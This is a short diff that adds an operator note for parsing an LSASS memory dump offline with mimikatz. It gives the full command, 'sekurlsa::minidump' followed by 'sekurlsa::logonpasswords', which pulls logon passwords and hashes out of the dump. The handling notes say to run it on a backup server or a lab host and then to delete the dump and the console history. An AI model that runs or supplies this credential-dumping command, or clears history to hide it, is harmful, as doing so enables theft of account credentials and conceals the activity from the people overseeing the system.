@@ -1,0 +1,9 @@
+Offline parsing of the LSASS dump
+
+  mimikatz.exe "sekurlsa::minidump C:\ProgramData\lsass.dmp" "sekurlsa::logonpasswords" "exit"
+
+Notes
+  - run on the backup server, or copy the dump to a lab-owned analysis host
+  - the command line contains the dump path but no credential
+  - output is consumed in the run and is not written to the repository
+  - delete the dump and the console history after the run
